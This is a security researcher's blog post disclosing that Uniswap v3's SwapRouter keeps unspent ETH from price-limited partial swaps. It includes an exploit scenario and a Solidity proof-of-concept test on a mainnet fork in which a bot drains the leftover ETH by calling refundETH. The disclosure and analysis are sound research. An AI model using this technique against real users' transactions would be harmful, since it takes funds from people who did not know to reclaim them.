---
title: "Public Bug Report: Uniswap's SwapRouter doesn't refund unspent ETH in partial swaps"
date: 2023-01-21T00:00:00+00:00
tags: [Bug Report, Uniswap, Blockchain]
---

![Hacking code](/images/florian-olivo-4hbJ-eymZ1o-unsplash.jpg)
Photo by
[Florian Olivo](https://unsplash.com/es/@florianolv?utm_source=unsplash&utm_medium=referral&utm_content=creditCopyText)
on [Unsplash](https://unsplash.com/photos/4hbJ-eymZ1o?utm_source=unsplash&utm_medium=referral&utm_content=creditCopyText)

In December 2022, I found a bug in Uniswap's `SwapRouter` contract. The bug allows users to lose funds, while interacting with the contract in the standard way. You don't really find critical and high severity bugs in projects like Uniswap, especially after they've run in production for several years. So I didn't really had high expectations and I was sure I wouldn't be awarded for the report. The bug looks real to me, and I wanted to figure out why would a project with high security standards leave it unfixed.

I submitted a bug report and after more than a month I received their response: they said the bug wasn't an issue, and everything worked as expected. I cannot agree with this 🙂 Thus I decided to disclose it publicly for some of you to learn something new and for more experienced security researches to decide whether the bug is real or not.

> tl;dr Here's the PoC: https://github.com/Jeiwan/uniswapv3-unrefunded-eth-poc

## Context
If you've ever used Uniswap, you know that the process is straightforward: you type in the amount of tokens you want to sell, click a button, sign a transaction, and it's done. I bet that, when you used Uniswap, you always sold an entire amount of tokens, but Uniswap also supports partial swaps: you can specify a limit price, which when reached, will interrupt the swap. As a result, only **a portion of the input token amount you specified will be consumed**. This is how it works:
1. The limit price is set via the [sqrtPriceLimitX96](https://github.com/Uniswap/v3-core/blob/05c10bf6d547d6121622ac51c457f93775e1df09/contracts/UniswapV3Pool.sol#L605) parameter of the [swap](https://github.com/Uniswap/v3-core/blob/05c10bf6d547d6121622ac51c457f93775e1df09/contracts/UniswapV3Pool.sol#L605) function.
1. Uniswap break a swap into multiple steps: on each step, it [swaps a portion of the input amount](https://github.com/Uniswap/v3-core/blob/05c10bf6d547d6121622ac51c457f93775e1df09/contracts/UniswapV3Pool.sol#L666-L674) and [re-calculates the input amount](https://github.com/Uniswap/v3-core/blob/05c10bf6d547d6121622ac51c457f93775e1df09/contracts/UniswapV3Pool.sol#L676-L682).
1. When the limit price is reached, it [stops swapping](https://github.com/Uniswap/v3-core/blob/05c10bf6d547d6121622ac51c457f93775e1df09/contracts/UniswapV3Pool.sol#L644).
1. After a swap is done, Uniswap [uses the calculated input and output amounts](https://github.com/Uniswap/v3-core/blob/05c10bf6d547d6121622ac51c457f93775e1df09/contracts/UniswapV3Pool.sol#L768-L770). What's important here is that it recalculates the input amount: if the swap was interrupted after reaching the limit price, **the input amount will be smaller that the one specified by the user**.

> To sum it up: when setting a limit price there's a chance that the input amount you specified during the `swap` call will be reduced, and you will eventually spend less tokens than you wanted initially.

Now, let's look at the [SwapRouter](https://github.com/Uniswap/v3-periphery/blob/6cce88e63e176af1ddb6cc56e029110289622317/contracts/SwapRouter.sol), which is the central contract of Uniswap–almost all interaction go through `SwapRouter`.

`SwapRouter` makes it easier for users to sell ETH: [the contract will wrap it for you](https://github.com/Uniswap/v3-periphery/blob/22bce38f7aca940212964bdfdf319b94ead9c3a8/contracts/base/PeripheryPayments.sol#L58-L61), you only need to send ETH along the call. For example, buying USDC for ETH via `SwapRouter` looks like this:
1. You call the [exactInputSingle](https://github.com/Uniswap/v3-periphery/blob/6cce88e63e176af1ddb6cc56e029110289622317/contracts/SwapRouter.sol#L115) or the [exactInput](https://github.com/Uniswap/v3-periphery/blob/6cce88e63e176af1ddb6cc56e029110289622317/contracts/SwapRouter.sol#L132) function, fill the parameters, and send some ETH long.
1. `SwapRouter` will [detect](https://github.com/Uniswap/v3-periphery/blob/22bce38f7aca940212964bdfdf319b94ead9c3a8/contracts/base/PeripheryPayments.sol#L58-L61) that you're selling ETH, will wrap it, and will send WETH to the pool.

> To sum it up: you're sending ETH, which is then wrapped to WETH by `SwapRouter`, and sold for USDC.

The final piece in the puzzle is how `SwapRouter` takes ERC20 tokens from users: it [pulls them](https://github.com/Uniswap/v3-periphery/blob/22bce38f7aca940212964bdfdf319b94ead9c3a8/contracts/base/PeripheryPayments.sol#L66-L67) after the pool has re-calculated input and output amounts:
1. a pool calculates amounts and calls the [uniswapV3SwapCallback](https://github.com/Uniswap/v3-core/blob/05c10bf6d547d6121622ac51c457f93775e1df09/contracts/UniswapV3Pool.sol#L773-L785);
1. in [the callback](https://github.com/Uniswap/v3-periphery/blob/6cce88e63e176af1ddb6cc56e029110289622317/contracts/SwapRouter.sol#L57-L84), the router pulls funds from the caller and sends them to the pool.

I.e. tokens are pulled from the user only **after a pool has re-calculated amounts**. But this works differently with ETH: ETH is sent with the call, **before** amounts are re-calculated–EVM doesn't allow to pull ETH from the caller.

I guess you already see the bug.

## Bug and Vulnerability
The bug is that `SwapRouter` doesn't refund unspent ETH. If you sell ETH and set a limit price and it's reached during the swap, then **the input amount will be reduced**, but you have already sent a bigger amount. The remaining amount will be left in the router.

The caller cannot know how much ETH will be spent by a swap: the Quoter contract, that's used to calculate swaps before executing them, [returns only the output amount, not the input one](https://github.com/Uniswap/v3-periphery/blob/6cce88e63e176af1ddb6cc56e029110289622317/contracts/lens/QuoterV2.sol#L127). Even if it had returned the input amount computed by a pool, the calculated input amount could have changed at the transaction execution time due to a price change, i.e. a slippage check would've been required on the input amount.

There's another subtle detail: when checking that the caller has sent enough ETH, [the contract uses the >= operation](https://github.com/Uniswap/v3-periphery/blob/22bce38f7aca940212964bdfdf319b94ead9c3a8/contracts/base/PeripheryPayments.sol#L58), which means it's ok if the caller sends more ETH than needed for a swap. I guess this breaks one of the invariants, e.g. "SwapRouter must never take more user funds than required for a swap". If the contract had used `=` instead, then all partial swaps would've failed. Which means refunding unspent ETH is the only solution to the problem.

Besides not refunding unspent ETH, `SwapRouter` allows anyone to [withdraw ETH from the contract](https://github.com/Uniswap/v3-periphery/blob/22bce38f7aca940212964bdfdf319b94ead9c3a8/contracts/base/PeripheryPayments.sol#L44-L46): anyone can withdraw the ETH `SwapRouter` hasn't returned to you after the swap–it may be a MEV bot or simply anyone who calls `refundETH` after your transaction.

## Exploit Scenario and a Proof of Concept
1. Alice wants to sell 1 ETH and buy some UNI. However, Alice wants her trade to be executed before the price X is reached.
2. Alice calls the `exactInputSingle` function of `SwapRouter`, sets the `sqrtPriceLimitX96` argument to the price X, and sends 1 ETH along with the transaction.
3. The router executes the swap via the ETH-UNI pool. The swap gets interrupted when the price X is reached.
4. Before reaching the price X, only 0.7 ETH of Alice were consumed to convert them to 100 UNI.
5. Alice receives 100 UNI while spending 1 ETH, the router contract keeps holding the remaining 0.3 ETH.
6. A MEV bot withdraws the 0.3 ETH by calling the `refundETH` function.

Here's a PoC ([repo with full code](https://github.com/Jeiwan/uniswapv3-unrefunded-eth-poc)):
```solidity
function testExploit() public {
    uint256 forkId = vm.createFork(vm.envString("ETH_RPC_URL"), 16454867);
    vm.selectFork(forkId);

    uint256 amountIn = 100 ether;

    vm.label(address(this), "user");
    vm.deal(address(this), amountIn);

    // Users sells 100 ETH to buy USDC. They have a limit price set.
    ExactInputSingleParams memory params = ExactInputSingleParams({
        tokenIn: weth,
        tokenOut: usdc,
        fee: 500,
        recipient: address(this),
        deadline: block.timestamp,
        amountIn: amountIn,
        amountOutMinimum: 0,
        sqrtPriceLimitX96: 1956260967287247098961477920037032 // (sqrtPrice before + sqrtPrice after) / 2
    });

    // Full input amount is sent along the call.
    router.exactInputSingle{value: amountIn}(params);

    // User has bought some USDC. However, the full input ETH amount wasn't used...
    assertEq(IERC20(usdc).balanceOf(address(this)), 81979.308775e6);

    // ... the remaining ETH is still in the Router contract.
    assertEq(address(router).balance, 50 ether);

    // A MEV bot steals the remaining ETH by calling the public refundETH function.
    address mev = address(0x31337);
    vm.label(mev, "mev");

    vm.prank(mev);
    router.refundETH();
    assertEq(address(mev).balance, 50 ether);
}
```

## Judging
### Uniswap's View
Uniswap says it works as expected. To not leave funds in `SwapRouter`, users should use the [MultiCall](https://github.com/Uniswap/v3-periphery/blob/6cce88e63e176af1ddb6cc56e029110289622317/contracts/base/Multicall.sol) functionality of the contract. `MultiCall` allows users to do multiple function calls in one transaction, thus Uniswap suggests that users should use `MultiCall` to swap tokens and call `refundETH` afterwards. They also said that the call to `refundETH` is made optional to reduce gas consumption for users.

Uniswap's JavaScript SDK also has [a check](https://github.com/Uniswap/universal-router-sdk/blob/106e53f232834f1cc8456963399f8295112ac405/src/entities/protocols/uniswap.ts#L98) that calls `refundETH` when there's a risk of leaving unspent funds in `SwapRouter`.

### My View
Despite the `MultiCall` functionality and the check in the JS SDK, my PoC is still valid 🙂 My PoC interacts with `SwapRouter` directly in a way it was designed and implemented. It may even do the `exactInputSingle` call via the multicall function, and it'll still be valid. `MultiCall`, in my view, is a different way of interacting with the contract, and even when it's used, a call to `refundETH` is not mandatory. So it still allows a loss of funds. Moreover, `MultiCall` is never used when trading ERC20 tokens, and, since `SwapRouter` makes selling ETH identical to selling an ERC20 token, users will simply never be aware of the requirement to use `MultiCall` to refund ETH.

## Conclusion
When I reported the bug I expected that Uniswap will say that it's a valid bug, they're aware of it, and they have strong reasons to not fix it. Surprisingly, they said it's not a bug at all. But if Uniswap says that users should always use `MultiCall` to refund unspent ETH, why doesn't `SwapRouter` do that for them? After all, the contract returns bought tokens to users–why can't it return unspent ETH? I guess answering this questions means confirming the vulnerability 🙂